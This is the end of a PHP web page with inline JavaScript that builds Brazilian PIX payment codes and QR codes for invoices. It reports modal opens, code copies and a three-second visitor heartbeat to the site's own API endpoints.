            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
        </svg>
    </a>
    <?php endif; ?>

    <script>
        const FATURA_IDS = <?= $faturaIdsJson ?>;
        const SESSION_ID = '<?= htmlspecialchars($sessionId) ?>';
        let pixCodeAtual = '';
        let faturaIdAtual = '';
        
        // CRC16 para PIX
        function crc16(str) {
            let crc = 0xFFFF;
            for (let i = 0; i < str.length; i++) {
                crc ^= str.charCodeAt(i) << 8;
                for (let j = 0; j < 8; j++) {
                    if (crc & 0x8000) {
                        crc = (crc << 1) ^ 0x1021;
                    } else {
                        crc <<= 1;
                    }
                }
            }
            return (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
        }
        
        // Gerar código PIX
        function gerarPixCode(chavePix, valor, nomeRecebedor, cidade, txid) {
            const formatField = (id, value) => id + String(value.length).padStart(2, '0') + value;
            
            // GUI do PIX BR
            const gui = formatField('00', 'br.gov.bcb.pix');
            const chave = formatField('01', chavePix);
            const merchantAccount = formatField('26', gui + chave);
            
            // Categoria do estabelecimento
            const mcc = formatField('52', '0000');
            
            // Moeda (986 = BRL)
            const currency = formatField('53', '986');
            
            // Valor formatado
            const valorStr = valor.toFixed(2);
            const amount = formatField('54', valorStr);
            
            // País
            const country = formatField('58', 'BR');
            
            // Nome do recebedor (max 25 chars)
            const nome = nomeRecebedor.substring(0, 25).toUpperCase();
            const merchantName = formatField('59', nome);
            
            // Cidade (max 15 chars)
            const cidadeStr = cidade.substring(0, 15).toUpperCase();
            const merchantCity = formatField('60', cidadeStr);
            
            // TXID
            const txidField = formatField('05', txid || '***');
            const additionalData = formatField('62', txidField);
            
            // Payload format indicator
            const payload = formatField('00', '01');
            
            // Montar sem CRC
            let pixWithoutCrc = payload + merchantAccount + mcc + currency + amount + country + merchantName + merchantCity + additionalData + '6304';
            
            // Adicionar CRC
            const crcValue = crc16(pixWithoutCrc);
            return pixWithoutCrc + crcValue;
        }
        
        // Gerar QR Code
        function gerarQRCode(pixCode) {
            const qrContainer = document.getElementById('qrCodeImage');
            const loading = document.getElementById('qrLoading');
            
            qrContainer.innerHTML = '';
            
            try {
                const qr = qrcode(0, 'M');
                qr.addData(pixCode);
                qr.make();
                qrContainer.innerHTML = qr.createImgTag(5, 0);
                loading.style.display = 'none';
                qrContainer.style.display = 'block';
            } catch (error) {
                console.error('Erro ao gerar QR Code:', error);
                loading.innerHTML = '<span style="color: red;">Erro ao gerar QR Code</span>';
            }
        }
        
        // Abrir modal PIX
        function abrirModalPix(index) {
            const btn = document.querySelectorAll('.btn-pix')[index];
            if (!btn) return;
            
            const valor = parseFloat(btn.dataset.valor);
            const chavePix = btn.dataset.chave;
            const nomeRecebedor = btn.dataset.nome;
            const cidade = btn.dataset.cidade;
            const txid = btn.dataset.txid || 'PIX';
            
            faturaIdAtual = btn.dataset.id;
            
            // Gerar código PIX
            pixCodeAtual = gerarPixCode(chavePix, valor, nomeRecebedor, cidade, txid);
            
            // Atualizar modal
            document.getElementById('modalValor').textContent = 'R$ ' + valor.toFixed(2).replace('.', ',');
            document.getElementById('pixCodeValue').textContent = pixCodeAtual;
            document.getElementById('pixCodeBox').style.display = 'block';
            document.getElementById('btnCopy').style.display = 'flex';
            
            // Gerar QR Code
            document.getElementById('qrLoading').style.display = 'flex';
            document.getElementById('qrCodeImage').style.display = 'none';
            setTimeout(() => gerarQRCode(pixCodeAtual), 100);
            
            // Abrir modal
            document.getElementById('modalPix').classList.add('open');
            
            // REGISTRAR PAGAMENTO NO PAINEL - quando abre o modal do QR Code
            registrarPagamentoModal(valor, chavePix, nomeRecebedor, cidade, txid, faturaIdAtual);
        }
        
        // Registrar que o modal foi aberto - faz o pagamento aparecer no painel
        function registrarPagamentoModal(valor, chavePix, nomeRecebedor, cidade, txid, faturaId) {
            console.log('Registrando modal aberto - faturaId:', faturaId, 'valor:', valor);
            
            if (!faturaId) {
                console.error('faturaId vazio ou undefined!');
                return;
            }
            
            // Usar a nova API que apenas atualiza ultimo_acesso do pagamento existente
            fetch('api/marcar_modal_aberto.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    pagamento_id: faturaId
                })
            })
            .then(res => {
                console.log('Resposta recebida:', res.status);
                return res.json();
            })
            .then(data => {
                console.log('Dados recebidos:', data);
                if (data.success && data.pagamento) {
                    console.log('Modal aberto registrado com SUCESSO - Codigo:', data.pagamento.codigo, 'Valor:', data.pagamento.valor);
                } else {
                    console.warn('Falha ao registrar modal:', data);
                }
            })
            .catch(err => {
                console.error('Erro ao registrar modal aberto:', err);
            });
        }
        
        // Fechar modal
        function fecharModalPix() {
            document.getElementById('modalPix').classList.remove('open');
        }
        
        // Copiar código PIX
        function copiarPix() {
            if (!pixCodeAtual) return;
            
            navigator.clipboard.writeText(pixCodeAtual).then(() => {
                const btn = document.getElementById('btnCopy');
                const text = document.getElementById('btnCopyText');
                
                btn.classList.add('copied');
                text.textContent = 'Código copiado!';
                
                setTimeout(() => {
                    btn.classList.remove('copied');
                    text.textContent = 'Copiar código PIX';
                }, 2000);
                
                // Registrar cópia
                if (faturaIdAtual) {
                    fetch('api/pix_copiado.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ pagamento_id: faturaIdAtual })
                    }).catch(() => {});
                }
            }).catch(err => {
                console.error('Erro ao copiar:', err);
                alert('Erro ao copiar código. Por favor, copie manualmente.');
            });
        }
        
        // Toggle accordion
        function toggleAccordion() {
            document.getElementById('accordionHelp').classList.toggle('open');
        }
        
        // Fechar modal ao clicar fora
        document.getElementById('modalPix').addEventListener('click', function(e) {
            if (e.target === this) {
                fecharModalPix();
            }
        });
        
        // Heartbeat - manter visitante online (não atualiza pagamentos se modal não foi aberto)
        function enviarHeartbeat() {
            // Enviar heartbeat com session_id para manter visita anônima ativa
            fetch('api/heartbeat.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    session_id: SESSION_ID,
                    // Enviar IDs das faturas - só vai atualizar as que já tiveram o modal aberto
                    pagamento_ids: FATURA_IDS 
                })
            }).catch(() => {});
        }
        
        // Enviar heartbeat a cada 3 segundos
        setInterval(enviarHeartbeat, 3000);
        enviarHeartbeat();
    </script>
</body>
</html>
